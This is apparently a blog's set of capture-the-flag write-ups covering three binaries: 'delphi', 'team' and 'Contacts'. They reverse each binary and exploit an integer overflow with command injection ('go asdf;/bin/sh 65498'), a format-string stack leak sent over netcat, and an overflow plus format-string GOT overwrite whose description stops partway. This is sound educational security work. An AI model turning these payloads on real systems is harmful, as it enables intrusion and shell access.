		  {% endhighlight %}
		  
		  So "go" is definetly what we want for the first part of our payload.
		  
		  Let's see where this takes us now...
		  {% highlight nasm lineanchors %}
		     0x401a04 <main.main+1924>:	mov    QWORD PTR [rsp],rcx
		     0x401a08 <main.main+1928>:	mov    QWORD PTR [rsp+0x70],rax
		     0x401a0d <main.main+1933>:	mov    QWORD PTR [rsp+0x8],rax
		  => 0x401a12 <main.main+1938>:	call   0x401c30 <main.doTheMagic>
		     0x401a17 <main.main+1943>:	lea    rbx,ds:0x4d4060
		     0x401a1f <main.main+1951>:	mov    rbp,QWORD PTR [rbx]
		     0x401a22 <main.main+1954>:	mov    QWORD PTR [rsp+0xd8],rbp
		     0x401a2a <main.main+1962>:	mov    rbp,QWORD PTR [rbx+0x8]
		  {% endhighlight %}
		  
		  Sweet :D, we can get to the magic function now...
		  {% highlight nasm lineanchors %}
		     0x401c77 <main.doTheMagic+71>:	mov    rdi,rbp
		     0x401c7a <main.doTheMagic+74>:	movs   QWORD PTR es:[rdi],QWORD PTR ds:[rsi]
		     0x401c7c <main.doTheMagic+76>:	movs   QWORD PTR es:[rdi],QWORD PTR ds:[rsi]
		  => 0x401c7e <main.doTheMagic+78>:	call   0x44a480 <strings.Split>
		     0x401c83 <main.doTheMagic+83>:	mov    rdx,QWORD PTR [rsp+0x20]
		     0x401c88 <main.doTheMagic+88>:	mov    rax,QWORD PTR [rsp+0x28]
		     0x401c8d <main.doTheMagic+93>:	mov    rcx,QWORD PTR [rsp+0x30]
		     0x401c92 <main.doTheMagic+98>:	mov    QWORD PTR [rsp+0x68],rdx
		  Guessed arguments:
		  arg[0]: 0x7ffff7e26d40 --> 0x8 
		  arg[1]: 0x4d37d0 --> 0x20 (' ')
		  {% endhighlight %}
		  
		  So it looks like our input is being split on spaces. We need to see how many parameters this thing expects...
		  {% highlight nasm lineanchors %}
		     0x0000000000401ca1 <+113>:	cmp    rax,0x1
		     0x0000000000401ca5 <+117>:	jne    0x401d57 <main.doTheMagic+295>
		     ...
		     0x0000000000401d57 <+295>:	cmp    rax,0x3
		     0x0000000000401d5b <+299>:	jne    0x401dd2 <main.doTheMagic+418>
		     ...
		  {% endhighlight %}
		  
		  If you take into consideration the control flow going on here, and taking a peak at the bottom of our magic function:
		  {% highlight nasm lineanchors %}
		     0x0000000000401dbf <+399>:	call   0x402230 <main._Cfunc_check_answer>
		  {% endhighlight %}
		  
		  It seems to me we want to go into that function and in order to do that we would have to have `rax == 3`. Since we know the value in rax is controlled by our split function's return value, we are going to have 3 parameters in our payload, one of them being "go". Thus, it will look something like this:
		  {% highlight bash lineanchors %}
		  go <something> <something>
		  {% endhighlight %}
		  
		  Alright, so let's checkout the check answer function:
		  {% highlight nasm lineanchors %}
		     0x0000000000402230 <+0>:	mov    rcx,QWORD PTR fs:0xfffffffffffffff0
		     0x0000000000402239 <+9>:	cmp    rsp,QWORD PTR [rcx]
		     0x000000000040223c <+12>:	ja     0x402245 <main._Cfunc_check_answer+21>
		     0x000000000040223e <+14>:	call   0x428280 <runtime.morestack16_noctxt>
		     0x0000000000402243 <+19>:	jmp    0x402230 <main._Cfunc_check_answer>
		     0x0000000000402245 <+21>:	sub    rsp,0x10
		     0x0000000000402249 <+25>:	mov    eax,0x400f80
		     0x000000000040224e <+30>:	mov    QWORD PTR [rsp],rax
		     0x0000000000402252 <+34>:	lea    rax,[rsp+0x18]
		     0x0000000000402257 <+39>:	mov    QWORD PTR [rsp+0x8],rax
		     0x000000000040225c <+44>:	call   0x404da0 <runtime.cgocall>
		     0x0000000000402261 <+49>:	add    rsp,0x10
		     0x0000000000402265 <+53>:	ret    
		     0x0000000000402266 <+54>:	add    BYTE PTR [rax],al
		     0x0000000000402268 <+56>:	add    BYTE PTR [rax],al
		     0x000000000040226a <+58>:	add    BYTE PTR [rax],al
		     0x000000000040226c <+60>:	add    BYTE PTR [rax],al
		     0x000000000040226e <+62>:	add    BYTE PTR [rax],al
		  {% endhighlight %}
		  
		  Looks like this function calls this function: 0x400f80. I guess we should check that out then:
		  {% highlight nasm lineanchors %}
		     0x0000000000400f80 <+0>:	mov    rsi,QWORD PTR [rdi+0x8]
		     0x0000000000400f84 <+4>:	mov    edi,DWORD PTR [rdi]
		     0x0000000000400f86 <+6>:	jmp    0x400de0 <check_answer@plt>
		  {% endhighlight %}
		  
		  Well then, I guess our check_answer function is really apart of that libtwenty.so shared object file since we see our program using the plt to call it. 
		  
		  What is inside this check_answer function?
		  {% highlight nasm lineanchors %}
		     ...
		     0x00007ffff7bd87d7 <+127>:	call   0x7ffff7bd8650 <strcat@plt>
		     0x00007ffff7bd87dc <+132>:	lea    rax,[rbp-0x90]
		     0x00007ffff7bd87e3 <+139>:	mov    rdi,rax
		     0x00007ffff7bd87e6 <+142>:	call   0x7ffff7bd8630 <system@plt>
		     ...
		  {% endhighlight %}
		  
		  Ooo, a strcat and system call as well as no input validation... interesting... let's try to see if we can get there:
		  {% highlight nasm lineanchors %}
		     ...
		     0x00007ffff7bd8770 <+24>:	mov    WORD PTR [rbp-0x2],0x2a           ; Move 42 into rbp-0x2 (let's call this var1)
		     0x00007ffff7bd8776 <+30>:	lea    rax,[rbp-0x90]                    ; Load the address rbp-0x90 into rax
		     0x00007ffff7bd877d <+37>:	mov    DWORD PTR [rax],0x6f686365        ; Put "echo" at rax
		     0x00007ffff7bd8783 <+43>:	mov    WORD PTR [rax+0x4],0x20           ; Put 32 at rax+4
		     0x00007ffff7bd8789 <+49>:	mov    eax,DWORD PTR [rbp-0x94]          ; Put our parsed second parameter into eax (found this out with a little more reversing)
		     0x00007ffff7bd878f <+55>:	add    WORD PTR [rbp-0x2],ax             ; Add rbp-0x2 (assigned to be 42) and our number and put back into rbp-0x2
		     0x00007ffff7bd8793 <+59>:	movzx  eax,WORD PTR [rbp-0x2]            ; Put rbp-0x2 into eax
		     0x00007ffff7bd8797 <+63>:	cmp    eax,0x4                           ; Compare our sum of input + 42 to 4
		     0x00007ffff7bd879a <+66>:	ja     0x7ffff7bd87ed <check_answer+149> ; If the sum is above 4, then exit check_answer
		     ...
		  {% endhighlight %}
		  
		  So here is where our control flow can take either the red or blue pill and we want the "ja" to fail so we don't end up at the end of the function, but instead in this interesting piece of code:
		  {% highlight nasm lineanchors %}
		     ...
		     0x00007ffff7bd879c <+68>:	mov    eax,eax
		     0x00007ffff7bd879e <+70>:	lea    rdx,[rax*4+0x0]
		     0x00007ffff7bd87a6 <+78>:	lea    rax,[rip+0xff]        # 0x7ffff7bd88ac
		     0x00007ffff7bd87ad <+85>:	mov    eax,DWORD PTR [rdx+rax*1]
		     0x00007ffff7bd87b0 <+88>:	movsxd rdx,eax
		     0x00007ffff7bd87b3 <+91>:	lea    rax,[rip+0xf2]        # 0x7ffff7bd88ac
		     0x00007ffff7bd87ba <+98>:	add    rax,rdx
		     0x00007ffff7bd87bd <+101>:	jmp    rax
		     ...
		  {% endhighlight %}
		  
		  Which does some calculation stuff and then jumps to rax. OK, so in our comparison code we take 42 and add it to our second parameter. At this point we can guess our payload will look something like this:
		  {% highlight bash lineanchors %}
		  go <something> <number>
		  {% endhighlight %}
		  
		  So if we start with 42 and add the number we specified, how can we get that to be less than or equal to 4? Hmmm... well an integer overflow would sure do the trick :D This assembly actually looks really funky, like why would you use the ax register and add it to WORD [rbp-0x2] and compare 4 to the WORD [rbp-0x2]? Since a WORD is only two bytes, if we send in the maximum value of a WORD and add it to any value, the carry bit is going to be discarded because we will have exceeded the size of a WORD. So what if we send the largest size of a WORD - 42 == 2^16 - 42 == 65494?
		  {% highlight nasm lineanchors %}
		  [----------------------------------registers-----------------------------------]
		  RAX: 0x0 
		  [-------------------------------------code-------------------------------------]
		     0x7ffff7bd8789 <check_answer+49>:	mov    eax,DWORD PTR [rbp-0x94]
		     0x7ffff7bd878f <check_answer+55>:	add    WORD PTR [rbp-0x2],ax
		     0x7ffff7bd8793 <check_answer+59>:	movzx  eax,WORD PTR [rbp-0x2]
		  => 0x7ffff7bd8797 <check_answer+63>:	cmp    eax,0x4
		     0x7ffff7bd879a <check_answer+66>:	ja     0x7ffff7bd87ed <check_answer+149>
		     0x7ffff7bd879c <check_answer+68>:	mov    eax,eax
		     0x7ffff7bd879e <check_answer+70>:	lea    rdx,[rax*4+0x0]
		     0x7ffff7bd87a6 <check_answer+78>:	lea    rax,[rip+0xff]        # 0x7ffff7bd88ac
		  {% endhighlight %}
		  
		  Woah, eax is 0! So now we are going to hit that weird jump code. Now the question is, what does eax have to be to get the system code to be called? Well we could do the math here, or since we know eax can only be 0, 1, 2 or 4 we could just try setting eax to be those different numbers until we get it to work :D
		  {% highlight bash lineanchors %}
		  ➜  yvr  ./delphi 
		  Welcome!
		  
		  Are you ready to play 20 questions? No? Perfect!
		  Im thinking of something big, metal, and orange. Go!
		  > go asdf 65494    # 2^16 - 42 + 0 == 65494 means eax = 0
		  > go asdf 65495    # 2^16 - 42 + 1 == 65495 means eax = 1
		  > go asdf 65496    # 2^16 - 42 + 2 == 65496 means eax = 2
		  > go asdf 65497    # 2^16 - 42 + 3 == 65497 means eax = 3
		  > go asdf 65498    # 2^16 - 42 + 4 == 65498 means eax = 4
		  asdf
		  > 
		  {% endhighlight %}
		  
		  Boom! So we got that system call to be executed and all it does right now is "echo <our string>". But if you look at the code again, it simply concatinates the 2nd part of our payload to the echo without checking for special characters, meaning we can just put a semicolon and execute arbituary commands :D
		  {% highlight bash lineanchors %}
		  ➜  yvr  ./delphi
		  Welcome!
		  
		  Are you ready to play 20 questions? No? Perfect!
		  Im thinking of something big, metal, and orange. Go!
		  > go asdf;/bin/sh 65498
		  asdf
		  $ cat flag.txt
		  flag{something or other}  # Not the actual flag, running locally
		  $ 
		  {% endhighlight %}
		  
		  Not too bad of a challenge, really was more reversing than actually exploitation. So when it all boils down, you have to reverse a basic command protocol, exploit an integer overflow and use metacharacter injection. For 200 points I would say that is reasonable :D
	- 2015-05-04-backdoor-team
		-
		- ## TL;DR
		  * Format string
		  
		  Given that this challenge was 600 points, I expected to be challenged with this one. But with 91 solves I think the people at SDSLabs kinda messed up on the points for this one lol.
		  
		  Checking out what type of file we were dealing with here:
		  {% highlight bash lineanchors %}
		  [~/Documents/CTFs/backdoor]$ file team
		  team: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, stripped
		  {% endhighlight %}
		  
		  Alright 32 bit, let's crack open IDA for this one then :D
		- ### Aside
		  This program is stripped, meaning that we do not have any labels for any of the functions (functions don't have function names). IDA tries to search for patterns in the disassembly for where functions exist. For example, functions typically consist of a function prolog, 
		  {% highlight nasm lineanchors %}
		  push    ebp
		  mov     ebp, esp
		  ...
		  {% endhighlight %}
		  and at the very end you would see something like, 
		  {% highlight nasm lineanchors %}
		  ...
		  leave
		  ret
		  {% endhighlight %}
		  
		  Looking at the code we can identify a function that IDA found to be the main function based on the parameters passed to `__libc_start_main`:
		  
		  {% highlight nasm lineanchors %}
		  ; int __cdecl main(int argc, const char **argv, const char **envp)
		  main proc near
		  
		  argc= dword ptr  8
		  argv= dword ptr  0Ch
		  envp= dword ptr  10h
		  
		  push    ebp
		  mov     ebp, esp
		  and     esp, 0FFFFFFF0h
		  sub     esp, 20h
		  mov     dword ptr [esp], 0C8h ; size
		  call    _malloc
		  mov     [esp+18h], eax
		  mov     dword ptr [esp], 64h ; size
		  call    _malloc
		  mov     [esp+1Ch], eax
		  mov     dword ptr [esp], offset format ; "Enter teamname: "
		  call    _printf
		  mov     eax, ds:stdout
		  mov     [esp], eax      ; stream
		  call    _fflush
		  mov     eax, [esp+18h]
		  mov     [esp+4], eax
		  mov     dword ptr [esp], offset a200s ; "%200s"
		  call    ___isoc99_scanf
		  mov     dword ptr [esp], offset aEnterFlag ; "Enter flag: "
		  call    _printf
		  mov     eax, ds:stdout
		  mov     [esp], eax      ; stream
		  call    _fflush
		  mov     eax, [esp+1Ch]
		  mov     [esp+4], eax
		  mov     dword ptr [esp], offset a100s ; "%100s"
		  call    ___isoc99_scanf
		  mov     dword ptr [esp], 2 ; seconds
		  call    _sleep
		  mov     eax, [esp+1Ch]
		  mov     [esp+4], eax
		  mov     eax, [esp+18h]
		  mov     [esp], eax
		  call    sub_80486AD
		  mov     eax, [esp+18h]
		  mov     [esp], eax      ; ptr
		  call    _free
		  mov     eax, [esp+1Ch]
		  mov     [esp], eax      ; ptr
		  call    _free
		  mov     eax, 0
		  leave
		  retn
		  main endp
		  {% endhighlight %}
		  
		  My initial guess at what the vulnerability in this program was was a heap overflow because there were some calls to `malloc` and `free` which is very typical of a heap overflow sort of challenge. But looking a little more into this function, we see a call to another function `call    sub_80486AD` which consists of:
		  
		  1) Opening the file "flag.txt"
		  {% highlight nasm lineanchors %}
		  ...
		  mov     dword ptr [esp+4], offset modes ; "r"
		  mov     dword ptr [esp], offset filename ; "flag.txt"
		  call    _fopen
		  mov     [ebp+stream], eax
		  ...
		  {% endhighlight %}
		  2) Reading the contents into a stack based buffer
		  {% highlight nasm lineanchors %}
		  ...
		  mov     eax, [ebp+stream]
		  mov     [esp+8], eax    ; stream
		  mov     dword ptr [esp+4], 64h ; n
		  lea     eax, [ebp+s]
		  mov     [esp], eax      ; s
		  call    _fgets
		  ...
		  {% endhighlight %}
		  
		  3) and...drum roll...a format string vulnerability :D
		  {% highlight nasm lineanchors %}
		  ...
		  mov     eax, [ebp+format]
		  mov     [esp], eax      ; format
		  call    _printf
		  ...
		  {% endhighlight %}
		  Now you may ask yourself why is this a format string vulnerabilty? OK, so there is only one parameter given to the `printf` function and with our extensive C knowledge we know that the first parameter to the `printf` function is the format specifier for the function. So if the format specifier is `"%s"` and `printf` goes to get the second parameter then it will go grab the next parameter given by the user as the second parameter, but since we only are giving it one parameter...what would happen? (read more here if you are unsure: [stanford crypto](https://crypto.stanford.edu/cs155/papers/formatstring-1.2.pdf)). Let's see which one of our inputs is actually the format string. If we look earlier in the program to see where this `format` string is coming from...
		  {% highlight nasm lineanchors %}
		  ...
		  mov     eax, [ebp+arg_0]
		  mov     [ebp+format], eax
		  ...
		  {% endhighlight %}
		  Alright so it is the first parameter to this function that is called. And if we look at when this function is called...
		  {% highlight nasm lineanchors %}
		  mov     eax, [esp+18h]
		  mov     [esp], eax
		  call    sub_80486AD
		  {% endhighlight %}
		  So `esp+18h` is where our buffer is located and that turns out to be...
		  {% highlight nasm lineanchors %}
		  mov     dword ptr [esp], offset format ; "Enter teamname: "
		  call    _printf         ; print out "Enter teamname: "
		  mov     eax, ds:stdout
		  mov     [esp], eax      ; stream
		  call    _fflush
		  mov     eax, [esp+18h]  ; the buffer passed into the vulnerable function
		  mov     [esp+4], eax
		  mov     dword ptr [esp], offset a200s ; "%200s"
		  call    ___isoc99_scanf ; read user input into the teamname buffer
		  {% endhighlight %}
		  So we know that what we enter into our teamname is the format string :D OK, so know we have the power to write and read to the stack and if we think about it for a second, our flag was read in from a file and put on a stack buffer... why don't we just dump the stack and then get our flag? (We thought that there was a pointer to the flag that we could just do a direct parameter access ie. "%12$s" to print out the flag really easily instead of parsing the stack but after a while of bruteforcing the direct parameter to access we started printing out environment variables and we knew that we went too far lol).
		  
		  {% highlight python lineanchors %}
		  [~] python -c 'print "%p"*30' | nc hack.bckdr.in 8004
		  Enter teamname: Enter flag: <contents of stack>
		  [~] python
		  >>> flag_hex = "<hex of flag>"
		  >>> "".join([chr(int(a[6:8], 16)) + chr(int(a[4:6], 16)) + chr(int(a[2:4], 16)) + chr(int(a[0:2], 16)) for a in flag_hex.split("0x") if a]
		  <flag>
		  {% endhighlight %}
		- ### Note
		  Since these challenges are still up, I just wrote down the steps to get the flag and not the actual flag itself
		  
		  So there you have it :D
		  
		  I would show the work that I did
	- 2015-09-28-csaw-ctf-contacts
		-
		- ### TL; DR
		  * Overflow
		  * Uninitialized Variable
		  * Format String
		  
		  CSAW CTF was a lot of fun this year (mostly because I was actually able to solve challenges ;D) and solving Contacts was pretty satisfying.
		  
		  Let's start by getting an idea what is up with it:
		  
		  {% highlight bash lineanchors %}
		  vagrant@precise64:~/csawctf$ file contacts
		  contacts: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x9736c7a26b5c55f97874c5e62d359e02c88cf2f1, stripped
		  {% endhighlight %}
		  
		  Alright, and the security mitigations it has:
		  
		  {% highlight bash lineanchors %}
		  vagrant@precise64:~/csawctf$ ~/Template/checksec.sh --file contacts
		  RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
		  Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   contacts
		  {% endhighlight %}
		  
		  Great, so it doesn't look like we are bouta drop some shellcode or overflow some stack based buffer anytime soon (we could in certain situations find the stack canary either with a leak or [brute force](http://hmarco.org/data/Preventing_brute_force_attacks_against_stack_canary_protection_on_networking_servers.pdf)).
		  
		  So if we play around with this a bit, we get an idea as to what is going on:
		  
		  {% highlight bash lineanchors %}
		  vagrant@precise64:~/csawctf$ ./contacts
		  Menu:
		  1)Create contact
		  2)Remove contact
		  3)Edit contact
		  4)Display contacts
		  5)Exit
		  {% endhighlight %}
		  
		  So we can create, remove, edit and display contacts. There are some things that we could look at first, the path that I first chose was looking at was the fact that you could specify how long your description was in your contact (this is a pretty common vuln in ctf problems).
		  
		  {% highlight bash lineanchors %}
		  >>> 1
		  Contact info:
		    Name: Poopy
		  [DEBUG] Haven't written a parser for phone numbers; You have 10 numbers
		    Enter Phone No: 1231231234
		    Length of description: 50
		    Enter description:
		        asdf
		  {% endhighlight %}
		  
		  So if we look at the first place we can supply our description, it is a pretty clear that we will not be overflowing anything anytime soon as the program allocates based on the size we provide:
		  
		  {% highlight nasm lineanchors %}
		  .text:0804884E                 mov     [esp+4], eax                ; Destination of our size
		  .text:08048852                 mov     dword ptr [esp], offset aUC ; "%u%*c"
		  .text:08048859                 call    ___isoc99_scanf
		  .text:0804885E                 mov     edx, [ebp+var_C]
		  .text:08048861                 mov     eax, [ebp+arg_0]
		  .text:08048864                 mov     [eax+48h], edx
		  .text:08048867                 mov     eax, [ebp+var_C]
		  .text:0804886A                 add     eax, 1
		  .text:0804886D                 mov     [esp], eax      ; size
		  .text:08048870                 call    _malloc
		  {% endhighlight %}
		  
		  and then reads into the allocated space the number of bytes we specify:
		  
		  {% highlight nasm lineanchors %}
		  .text:0804889D                 mov     ecx, ds:stdin
		  .text:080488A3                 mov     eax, [ebp+var_C] ; Our size
		  .text:080488A6                 add     eax, 1
		  .text:080488A9                 mov     edx, eax
		  .text:080488AB                 mov     eax, [ebp+arg_0]
		  .text:080488AE                 mov     eax, [eax]
		  .text:080488B0                 mov     [esp+8], ecx    ; stream
		  .text:080488B4                 mov     [esp+4], edx    ; n
		  .text:080488B8                 mov     [esp], eax      ; s
		  .text:080488BB                 call    _fgets
		  {% endhighlight %}
		  
		  But what about when we edit our contact? Well it turns out that that the description is allocated and read in the same way as when we create the contact :C
		  
		  When trying to solve a challenge with so many places to input data, it doesn't hurt to make a guess as to a potential vulnerability even if it turns out to be a dead end, especially when you are pressed for time.
		  
		  Let's now checkout that innocent looking name input (really just going through all potential inputs at this point):
		  
		  {% highlight nasm lineanchors %}
		  .text:080487D3 get_name        proc near               ; CODE XREF: add_contact+3Fp
		  .text:080487D3
		  .text:080487D3 arg_0           = dword ptr  8
		  ...
		  .text:080487E5                 mov     eax, ds:stdin
		  .text:080487EA                 mov     edx, [ebp+arg_0]
		  .text:080487ED                 add     edx, 8
		  .text:080487F0                 mov     [esp+8], eax    ; stream
		  .text:080487F4                 mov     dword ptr [esp+4], 64 ; n
		  .text:080487FC                 mov     [esp], edx      ; s
		  .text:080487FF                 call    _fgets
		  {% endhighlight %}
		  
		  Hmmm... what is arg_0 in `add_contact` (this was a stripped binary so these are names that I gave each function):
		  
		  {% highlight nasm lineanchors %}
		  .text:08048B5E add_contact     proc near               ; CODE XREF: main+B6p
		  .text:08048B5E
		  .text:08048B5E var_10          = dword ptr -10h
		  .text:08048B5E var_C           = dword ptr -0Ch
		  .text:08048B5E arg_0           = dword ptr  8
		  ...
		  .text:08048B64                 mov     eax, [ebp+arg_0]
		  .text:08048B67                 mov     [ebp+var_10], eax
		  ...
		  .text:08048B97                 mov     eax, [ebp+var_10]
		  .text:08048B9A                 mov     [esp], eax
		  .text:08048B9D                 call    get_name
		  {% endhighlight %}
		  
		  What does main pass `add_contact` as a parameter then?
		  
		  {% highlight nasm lineanchors %}
		  .text:0804876C                 mov     dword ptr [esp], offset unk_804B0A0 ; jumptable 0804876A case 1
		  .text:08048773                 call    add_contact
		  {% endhighlight %}
		  
		  ...where the fuck is `unk_804B0A0`?
		  
		  {% highlight nasm lineanchors %}
		  .bss:0804B0A0 unk_804B0A0     db    ? ;               ; DATA XREF: main:loc_804876Co
		  .bss:0804B0A0                                         ; main:loc_804877Ao ...
		  .bss:0804B0A1                 db    ? ;
		  .bss:0804B0A2                 db    ? ;
		  {% endhighlight %}
		  
		  Oh! So we read the name into the bss segment. If we do a little more reversing of the `add_contact` function, we realize that each contact is stored in the bss segment in a struct that resembles:
		  
		  {% highlight c lineanchors %}
		  struct contact {
		    char *desc;          // Heap pointer
		    char *phone;         // Heap pointer
		    char name[64];
		    int description_len;
		    int is_person;       // Used in print_contacts
		  }
		  
		  Total bytes for a contact = 2 * sizeof(char *) + 2 * sizeof(int) + 64 * sizeof(char) = 80 bytes
		  {% endhighlight %}
		  
		  So as we add more contacts, we are adding to the contacts list located in the bss segment. So if we make 3 contacts, `0x0804B0A0` will look like:
		  
		  {% highlight nasm lineanchors %}
		  0x0804B0A0+0x0      Contact 1
		  0x0804B0A0+0x80     Contact 2
		  0x0804B0A0+0x100    Contact 3
		  {% endhighlight %}
		  
		  So when we initally create our contact, it reads the correct amount into our name buffer:
		  
		  {% highlight nasm lineanchors %}
		  .text:080487F4                 mov     dword ptr [esp+4], 64 ; n
		  {% endhighlight %}
		  
		  But what about when we change our name...
		  
		  {% highlight nasm lineanchors %}
		  .text:08048A4E                 mov     edx, ds:stdin
		  .text:08048A54                 mov     eax, [ebp+n]
		  .text:08048A57                 mov     ecx, [ebp+var_54]
		  .text:08048A5A                 add     ecx, 8
		  .text:08048A5D                 mov     [esp+8], edx    ; stream
		  .text:08048A61                 mov     [esp+4], eax    ; n
		  .text:08048A65                 mov     [esp], ecx      ; s
		  .text:08048A68                 call    _fgets
		  {% endhighlight %}
		  
		  Hmmm, that is a little strange. What is that `[ebp+n]` set to? If you look at all the times `[ebp+n]` is referenced in `edit_contact` you will find that it is only ever accessed and never assigned!
		  
		  ![uninitialized variable](https://i.imgur.com/YurOMQq.png)
		  
		  That means that `[ebp+n]` is an uninitialized variable, meaning that whatever value that was left on the stack from a previous function call would be used as the value for `[ebp+n]`. I did not bother to really check what value would exactly be there, but if you shove a bunch of As in, you find out quickly that it is definetly a number bigger than 64:
		  
		  {% highlight bash lineanchors %}
		  Name to change? Dolan
		  1.Change name
		  2.Change description
		  >>> 1
		  New name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
		  Menu:
		  1)Create contact
		  2)Remove contact
		  3)Edit contact
		  4)Display contacts
		  5)Exit
		  >>> 4
		  Contacts:
		    Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
		    Length 1094795585
		    Phone #: 8675309
		    Description: Drop it like it's hot
		    Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
		    Length 1337
		  Segmentation fault
		  {% endhighlight %}
		  
		  Now what is important to realize is that you have to make a second contact because the crash is a result of you overflowing the name buffer of the first person all the way into a pointer of the second person. And when you go to print out the second person, the program doesn't have access to the memory at `0x41414141`:
		  
		  {% highlight bash lineanchors %}
		  Program received signal SIGSEGV, Segmentation fault.
		  --------------------------------------------------------------------------[regs]
		  ESI: 0xFFFFCF88  EDI: 0x41414141
		  --------------------------------------------------------------------------[code]
		  => 0xf7e64a6a <vfprintf+9098>:    repnz scas al,BYTE PTR es:[edi] ; Can't dereference edi, because edi = 0x41414141
		  --------------------------------------------------------------------------------
		  0xf7e64a6a in vfprintf () from /lib/i386-linux-gnu/libc.so.6
		  gdb$
		  {% endhighlight %}
		  
		  So in our contacts list at the point of the crash, it would look something like:
		  
		  {% highlight c lineanchors %}
		  contact 1:
		    char *desc          = some pointer;
		    char *phone         = some pointer;
		    char name[64]       = AAAAAAAAAAAAA... (repeats 64 times)
		    int description_len = AAAA
		    int is_person       = AAAA
		  contact 2:
		    char *desc          = AAAA <-- Not a valid pointer (will crash if you try to access it)
		    char *phone         = AAAA <-- Not a valid pointer
		    char name[64]       = AAAAAAAAAAAAA... (repeats 64 times)
		    int description_len = AAAA
		    int is_person       = AAAA
		  {% endhighlight %}
		  
		  If we take a quick look at `print_contact` we see something interesting...
		  
		  {% highlight nasm lineanchors %}
		  .text:08048BD7                 mov     eax, [ebp+arg_0]
		  .text:08048BDA                 mov     [esp+4], eax
		  .text:08048BDE                 mov     dword ptr [esp], offset aNameS ; "\tName: %s\n"
		  .text:08048BE5                 call    _printf
		  .text:08048BEA                 mov     eax, [ebp+arg_4]
		  .text:08048BED                 mov     [esp+4], eax
		  .text:08048BF1                 mov     dword ptr [esp], offset aLengthU ; "\tLength %u\n"
		  .text:08048BF8                 call    _printf
		  .text:08048BFD                 mov     eax, [ebp+arg_8]
		  .text:08048C00                 mov     [esp+4], eax
		  .text:08048C04                 mov     dword ptr [esp], offset aPhoneS ; "\tPhone #: %s\n"
		  .text:08048C0B                 call    _printf
		  .text:08048C10                 mov     dword ptr [esp], offset aDescription_0 ; "\tDescription: "
		  .text:08048C17                 call    _printf
		  .text:08048C1C                 mov     eax, [ebp+format]
		  .text:08048C1F                 mov     [esp], eax      ; format
		  .text:08048C22                 call    _printf
		  {% endhighlight %}
		  
		  A format string vulnerability at `.text:08048C22`! Cool, and if we look at the code, it looks like the description is the culprit.
		  
		  So now the question is, how do we put this all together? Well for starters, we don't have any calls to `system` or `execve` which would give us a shell on the system so that means we would need either a libc leak (by reading from a GOT pointer) or guessing the libc that the challenge is using. During the competition we exfiltrated the libc binary from the challenge, precision (for a 32 bit libc it is located here `/lib/i386-linux-gnu/libc.so.6`). And dropping this libc in IDA we can find out where `system` is relative to whatever we decide to leak.
		  
		  But we are still left with the problem of leaking some sort of address located in libc that we can apply some offset to to find the address of libc.
		  
		  Well we do have a write primitive with our format string so let's see if that gives us anything interesting...
		  
		  {% highlight bash lineanchors %}
		  Menu:
		  1)Create contact
		  2)Remove contact
		  3)Edit contact
		  4)Display contacts
		  5)Exit
		  >>> 1
		  Contact info:
		    Name: A
		  [DEBUG] Haven't written a parser for phone numbers; You have 10 numbers
		    Enter Phone No: A
		    Length of description: 100
		    Enter description:
		        %x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x
		  Menu:
		  1)Create contact
		  2)Remove contact
		  3)Edit contact
		  4)Display contacts
		  5)Exit
		  >>> 4
		  Contacts:
		    Name: A
		    Length 100
		    Phone #: A
		    Description: 8f3a008.f7614971.f776cff4.0.0.fffc5b08.8048c99.804b0a8.64.8f3a008.8f3a018
		  {% endhighlight %}
		  
		  The second address looks pretty interesting, I wonder what it resolves to:
		  
		  {% highlight nasm lineanchors %}
		  gdb$ x/5i f7e6c971
		   0xf7e6c971 <_IO_vfscanf+17>:    add    ebx,0x158683
		   0xf7e6c977 <_IO_vfscanf+23>: sub    esp,0x22c
		   0xf7e6c97d <_IO_vfscanf+29>: mov    esi,DWORD PTR [ebp+0x8]
		   0xf7e6c980 <_IO_vfscanf+32>: mov    DWORD PTR [ebp-0x1b0],eax
		   0xf7e6c986 <_IO_vfscanf+38>: mov    edi,DWORD PTR [ebp+0xc]
		  {% endhighlight %}
		  
		  Too easy. So we can find the offset between `_IO_vfscanf+17` and `system` (actually making this writeup I realized that I fucked up the offset, I found the offset from `_IO_vfscanf` to `system` forgetting to subtract 17 from the offset :c. I got really frusted that it wasn't working so I bruteforced the offset and after 17 iterations it worked lol :3).
		  
		  Also to cover all components of the exploit, the first address that we read off the stack in the format string `0x8f3a008` is actually the address of our phone number pointer which we know to be a heap address. Based on this address, we can actually determine where all other allocations will be made (by using a debugger and finding where things are allocated relative to our first phone number allocation).
		  
		  What is interesting is that with our name overflow, we can actually overflow the phone number pointer and cause it to become any pointer that we want. For example, it could be the GOT address of `strcmp` for example ;D
		  
		  If we look at `edit_contact`, we see that it is using `strcmp` to compare our inputed name to the names that it knows of:
		  
		  {% highlight nasm lineanchors %}
		  .text:08048A04                 mov     [esp+4], eax    ; s2
		  .text:08048A08                 lea     eax, [ebp+s]
		  .text:08048A0B                 mov     [esp], eax      ; s1
		  .text:08048A0E                 call    _strcmp
		  {% endhighlight %}
		  
		  So this code will turn from:
		  
		  {% highlight c lineanchors %}
		  strcmp(our_stuff, name);
		  {% endhighlight %}
		  
		  to
		  
		  {% highlight c lineanchors %}
		  system(our_stuff)
		  {% endhighlight %}
		  
		  With the phone number pointer being on the stack at the time of our format string vuln, we can have an arbiturary write to anywhere in the program by just changing the phone number pointer in our overflow :3
		  
		  So our approach now becomes:
		  
		  1. Create the first person
		  2. Set their name and phone number to be anything
		  3. Set their description to be "%x.%x"
		  4. Print out the contact
